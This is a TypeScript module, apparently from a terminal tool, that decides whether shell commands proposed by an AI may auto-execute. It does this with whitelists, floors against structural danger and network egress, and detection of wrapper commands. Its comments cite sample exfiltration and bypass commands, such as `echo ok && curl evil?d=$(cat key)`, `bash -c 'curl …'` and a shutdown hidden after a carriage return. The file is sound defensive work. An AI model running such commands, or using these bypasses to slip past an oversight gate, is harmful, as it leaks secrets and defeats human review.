 * The names a command word may run as. A backslash is a POSIX escape (`c\url`
 * runs curl) but also a Windows path separator (`bin\curl.exe`), so both
 * readings are returned.
 */
function commandNames(word: string): string[] {
    const asPath = normalizeBaseCommand(word);
    const unescaped = normalizeBaseCommand(word.replace(/\\/g, ''));
    return unescaped === asPath ? [asPath] : [asPath, unescaped];
}

/** A leading shell assignment, `FOO=1` in `FOO=1 curl …`. */
function isAssignment(tok: string): boolean {
    return /^[A-Za-z_][A-Za-z0-9_]*=/.test(tok);
}

/**
 * The tokens of one pipe segment that may name a program about to run, rather
 * than data handed to one — its *command positions*, widened as described below
 * wherever a position cannot be pinned down safely.
 *
 * The first token always qualifies. Past it, only a wrapper's payload does: when
 * the token just taken is a {@link RUNNER_COMMANDS} entry, the tokens belonging
 * to the wrapper itself — its flags (`-c`, `-I{}`), `VAR=value` assignments, and
 * a bare count or duration (`timeout 5`) — are skipped and the next word is a
 * command position too. Repeatedly, so the `curl` in `nohup timeout 5 curl …` is
 * still reached.
 *
 * This is what the network-egress floor was missing. It tested only the base
 * command, so a single wrapper word walked straight past it: `bash -c 'curl …'`,
 * `env curl …`, `timeout 5 curl …` and `echo x | xargs curl …` each reported a
 * base of `bash`/`env`/`timeout`/`xargs` — none an egress tool — and went on to
 * the AI verdict, which rates a plain GET read-only and auto-ran it. That is the
 * exfiltration path the floor exists to close.
 *
 * Scanning *every* token instead would be unusable, which is why this walks
 * positions rather than words: `curl`, `wget`, `ssh` and `nmap` are ordinary
 * arguments too, so `grep ssh /etc/passwd`, `which curl`, `ps aux | grep ssh` and
 * `ls /etc/ssh` would every one of them stop auto-executing. The walk stops at
 * `grep`/`which`/`ls` because none is a runner, so those are untouched. Being a
 * runner is not itself disqualifying here either — `git status`, `find . -name
 * '*.log'`, `less /var/log/syslog` and `timeout 5 ping 8.8.8.8` pass this
 * floor, because what follows the wrapper is not an egress tool. Passing the
 * floor is not the same as auto-executing: a runner never matches the
 * whitelist, so these go on to the AI verdict (hybrid) or to the user
 * (static) rather than running on the whitelist fast path.
 *
 * Three widenings close the ways around that walk:
 * - Leading `VAR=value` assignments are skipped first — `FOO=1 curl …` runs curl.
 * - A {@link PREFIX_WRAPPERS} entry contributes every remaining word, because
 *   what separates it from its command differs per wrapper (`flock <file>`,
 *   `chroot <dir>`, `runuser -u <user>`) and a flag-skipping walk read those
 *   arguments as the command. `command -v curl` is a lookup, not a run, and is
 *   left alone like `which curl`.
 * - An {@link EXEC_MARKERS} word anywhere in the segment contributes every word
 *   after it: `ip netns exec ns curl …`, `docker exec c curl …`, `find . -exec
 *   curl {} +` — none of `ip`, `docker` or the `.` after `find` is a wrapper.
 */
function commandPositions(segment: string): Array<{ word: string; index: number }> {
    const toks = segment.trim().split(/\s+/).filter(Boolean);
    const out: Array<{ word: string; index: number }> = [];
    const rest = (from: number) => toks.slice(from).map((t, k) => ({ word: commandWord(t), index: from + k }));

    const marker = toks.findIndex(
        (t, idx) => idx > 0 && EXEC_MARKERS.has(commandWord(t).toLowerCase()),
    );
    if (marker >= 0) out.push(...rest(marker + 1));

    let i = 0;
    while (i < toks.length && isAssignment(stripTokenQuotes(toks[i]))) i++;
    while (i < toks.length) {
        const tok = commandWord(toks[i]);
        out.push({ word: tok, index: i });
        const names = commandNames(tok);
        const wrapper = names.find((n) => PREFIX_WRAPPERS.has(n));
        if (wrapper) {
            const next = toks[i + 1];
            const isLookup = wrapper === 'command' && (next === '-v' || next === '-V');
            if (!isLookup) out.push(...rest(i + 1));
            break;
        }
        if (!names.some((n) => RUNNER_COMMANDS.has(n))) break;
        i++;
        while (i < toks.length) {
            const t = toks[i];
            const belongsToWrapper =
                // POSIX flag, `-c` / `-I{}` / `-o0`.
                t.startsWith('-') ||
                // Windows flag, `cmd /c` / `/k`. Bounded to three characters so a
                // single-segment absolute path is not mistaken for one; anything
                // with a second separator (`/usr/bin/curl`) fails this anyway and
                // is read as the command it is.
                /^\/[A-Za-z?]{1,3}$/.test(t) ||
                // A `VAR=value` assignment after the runner.
                isAssignment(t) ||
                // A bare count or duration, `timeout 5` / `timeout 5s`.
                /^\d+[smhd]?$/.test(t);
            if (!belongsToWrapper) break;
            i++;
        }
    }
    return out;
}

// ── Public API ──────────────────────────────────────────────────────────────

export interface StructuralDanger {
    /** True if the command contains a floor-level dangerous shell construct. */
    danger: boolean;
    /** Which construct, for the UI (empty when `danger` is false). */
    reason: string;
}

/**
 * Structural-danger floor: whether a command contains a shell construct —
 * redirection, command substitution, chaining/backgrounding, or privilege
 * escalation — that must NEVER auto-execute, whatever a verdict rates it.
 *
 * Shared by {@link classifyCommand} (the whitelist fast-path) and the auto-exec
 * orchestrator so the AI path is gated by the same floor: a command the
 * whitelist rejects for, say, `&&` or `$(…)` can't then be auto-approved by the
 * AI verdict (an exfiltration vector like `echo ok && curl evil?d=$(cat key)`).
 *
 * Splits on CR/LF exactly like `classifyCommand` and the PTY dispatcher, so a
 * dangerous line hidden after a bare CR can't slip past the scan.
 */
export function structuralDanger(command: string): StructuralDanger {
    const lines = command
        .split(/\r\n|\r|\n/)
        .map((l) => l.trim())
        .filter((l) => l.length > 0);
    for (const line of lines) {
        for (const { pattern, reason } of DANGER_PATTERNS) {
            if (pattern.test(line)) {
                return { danger: true, reason };
            }
        }
        if (hasUnquotedGrouping(line)) {
            return {
                danger: true,
                reason: 'Contains a grouping bracket ( ) or script block { } that can run another command',
            };
        }
    }
    return { danger: false, reason: '' };
}

/**
 * Network-egress floor: whether any line/pipe segment invokes a transfer,
 * raw-socket, tunnel or scanning tool. Such a command never auto-executes,
 * whatever the AI verdict rates it — see {@link NETWORK_EGRESS_COMMANDS}.
 *
 * Applied by the auto-exec orchestrator immediately after
 * {@link structuralDanger}, i.e. before the `ai`-strategy early return, so all
 * three strategies are covered. A manual Run is still offered.
 *
 * Splits on CR/LF and `|` exactly like {@link classifyCommand}, so an egress
 * tool hidden after a bare CR or behind a pipe can't slip past the scan, and
 * within each segment it scans every *command position* rather than only the
 * base — see {@link commandPositions} for why that distinction carries the whole
 * fix.
 *
 * Besides the egress tools themselves it stops, on every strategy: a word that
 * names another machine ({@link namesRemotePath}); an interpreter given inline
 * code ({@link INLINE_CODE_OPTIONS}) or piped a program
 * ({@link STDIN_INTERPRETERS}); and the egress options of read tools
 * ({@link EGRESS_OPTION_RULES}, e.g. `dig @server`).
 */
export function networkEgressDanger(command: string): StructuralDanger {
    const lines = command
        .split(/\r\n|\r|\n/)
        .map((l) => l.trim())
        .filter((l) => l.length > 0);
    for (const line of lines) {
        const segments = line.split('|');
        for (let s = 0; s < segments.length; s++) {
            const segment = segments[s];
            const words = segment.trim().split(/\s+/).filter(Boolean);

            if (words.some(namesRemotePath)) {
                return {
                    danger: true,
                    reason: 'A UNC path (\\\\host\\share) connects to another machine — needs manual review',
                };
            }

            for (const { word: tok, index } of commandPositions(segment)) {
                // `c$@url`, `$CMD …`: the name the shell runs is not the one written.
                if (tok.includes('$') && !isAssignment(tok)) {
                    return {
                        danger: true,
                        reason: 'A command name built from a variable ($) — needs manual review',
                    };
                }
                // The rest of the segment from this command on: its own arguments.
                const own = words.slice(index);

                for (const name of commandNames(tok)) {
                    if (NETWORK_EGRESS_COMMANDS.has(name)) {
                        return {
                            danger: true,
                            reason: `"${name}" can send data off this host — needs manual review`,
                        };
                    }

                    const family = interpreterFamily(name);

                    if (hasInlineCode(name, family, own.slice(1))) {
                        return {
                            danger: true,
                            reason: `"${name}" runs inline code that can reach the network — needs manual review`,
                        };
                    }
                    // Wherever it sits in the segment: `| env sh` and `| timeout 5 sh`
                    // read the program from the pipe just like `| sh`.
                    if (s > 0 && STDIN_INTERPRETERS.has(family)) {
                        return {
                            danger: true,
                            reason: `"${name}" runs a program piped into it — needs manual review`,
                        };
                    }

                    const rules = EGRESS_OPTION_RULES[name];
                    const ownLine = own.join(' ');
                    const hit = rules?.find((r) => r.patterns.some((p) => p.test(ownLine)) || r.check?.(ownLine));
                    if (hit) {
                        return { danger: true, reason: `${hit.reason} — needs manual review` };
                    }
                }
            }
        }
    }
    return { danger: false, reason: '' };
}

/**
 * Classify a command as safe (auto-executable) or not, against a whitelist.
 *
 * @param command   Raw command string from AI
 * @param whitelist Caller-supplied whitelist entries (base-command tokens and/or
 *                  multi-token phrases). Defaults live in `commandLists.ts`.
 * @returns         Classification result with reason
 */
export function classifyCommand(
    command: string,
    whitelist: string[] = [],
): CommandClassification {
    const trimmed = command.trim();

    // Step 1: empty check
    if (!trimmed) {
        return { safe: false, reason: 'Empty command' };
    }

    // Split the whitelist into base-command tokens (no whitespace) and phrases.
    const tokenSet = new Set<string>();
    const phrases: string[] = [];
    for (const raw of whitelist) {
        const e = raw.trim().toLowerCase();
        if (!e) continue;
        if (/\s/.test(e)) phrases.push(e);
        else tokenSet.add(e);
    }

    // Step 1.5: multi-line handling — classify each line independently.
    // Split on CR as well as LF: a bare CR is Enter to the PTY line discipline,
    // so `ls\rshutdown` runs two commands. Splitting only on \n would let a
    // whitelisted first token shield an unlisted command hidden after the CR
    // (auto-exec bypass). The dispatcher (App.tsx) splits on the same set.
    const lines = trimmed.split(/\r\n|\r|\n/).map(l => l.trim()).filter(l => l.length > 0);
    if (lines.length > 1) {
        for (const line of lines) {
            const result = classifyCommand(line, whitelist);
            if (!result.safe) {
                return result;
            }
        }
        return { safe: true, reason: 'All commands are whitelisted' };
    }

    // Step 2: danger patterns (before pipe splitting) — structural integrity floor.
    // `trimmed` is a single line here (multi-line was handled above), so this is
    // the same shared floor the auto-exec orchestrator applies to every path.
    const danger = structuralDanger(trimmed);
    if (danger.danger) {
        return { safe: false, reason: danger.reason };
    }

    // Step 2.5: variable expansion. Every rule below reads the words as written,
    // but the shell substitutes and re-splits an unquoted `$x` / `$@` / `${x}`
    // first, so what runs is not what was judged. Single-quoted text is literal
    // (`awk '{print $1}'`); anything else asks.
    if (/\$[\w{@*#?!$-]/.test(trimmed.replace(/'[^']*'/g, ''))) {
        return { safe: false, reason: 'Contains a variable expansion ($) — needs AI/manual review' };
    }
    // cmd expands `%NAME%`, `%NAME:~0,1%` and `!NAME!` whatever the quoting, and
    // a slice of a built-in variable can spell any word. One-letter names are
    // left alone so `date +%Y%m%d` keeps auto-running.
    if (/%[A-Za-z_]\w+(?::[^%]*)?%|![A-Za-z_]\w+(?::[^!]*)?!/.test(trimmed)) {
        return { safe: false, reason: 'Contains a cmd variable expansion (%…% / !…!) — needs AI/manual review' };
    }

    // Step 3: split by pipe and evaluate each segment
    const segments = trimmed.split('|').map(s => s.trim()).filter(Boolean);

    for (const segment of segments) {
        const result = classifySegment(segment, tokenSet, phrases);
        if (!result.safe) {
            return result;
        }
    }

    return { safe: true, reason: 'All commands are whitelisted' };
}

// ── Internal helpers ────────────────────────────────────────────────────────

function classifySegment(
    segment: string,
    tokenSet: Set<string>,
    phrases: string[],
): CommandClassification {
    const baseCommand = extractBaseCommand(segment);
    if (!baseCommand) {
        return { safe: false, reason: 'Cannot parse command' };
    }

    const baseLower = baseCommand.toLowerCase();
    const segLower = segment.toLowerCase();

    // Runner / interpreter commands have shell-exec or file-write escape hatches
    // that a base-command whitelist can't safely gate. Never auto-exec them via
    // the whitelist — defer to the AI verdict (hybrid) or a manual ask (static).
    // Checked BEFORE the whitelist so a whitelisted runner (find/git/sed/awk/env)
    // still can't take the fast path.
    //
    // Normalized, unlike the whitelist lookups below: those compare against
    // user-supplied tokens and must keep matching literally, but a runner is a
    // runner however it is spelled, and the raw comparison missed `/bin/bash`
    // and `bash.exe`  letting a path-qualified shell take the fast path that a
    // bare `bash` is denied.
    if (RUNNER_COMMANDS.has(normalizeBaseCommand(baseCommand))) {
        return {
            safe: false,
            reason: `"${baseCommand}" can run arbitrary commands — needs AI/manual review`,
        };
    }

    // Whitelisted if the base command is a whitelist token …
    if (tokenSet.has(baseLower)) {
        const flagRules = DANGEROUS_FLAGS[baseLower];
        if (flagRules) {
            for (const rule of flagRules) {
                if (rule.patterns.some((pat) => pat.test(segment)) || rule.check?.(segment)) {
                    return { safe: false, reason: rule.reason };
                }
            }
        }
        return { safe: true, reason: '' };
    }

    // … or a whitelist phrase matches the segment as an anchored prefix (the
    // phrase must START the segment, on a word boundary). Anchoring prevents a
    // benign whitelisted phrase from auto-allowing any command that merely
    // CONTAINS it as a substring (e.g. `… # git log` smuggling past a `git log`
    // entry) — an auto-exec escalation vector.
    if (phrases.some((p) => segLower === p || segLower.startsWith(`${p} `))) {
        return { safe: true, reason: '' };
    }

    return { safe: false, reason: `Unknown command: ${baseCommand}` };
}

export function extractBaseCommand(segment: string): string | null {
    const trimmed = segment.trim();
    if (!trimmed) return null;

    const match = trimmed.match(/^(\S+)/);
    return match ? match[1] : null;
}
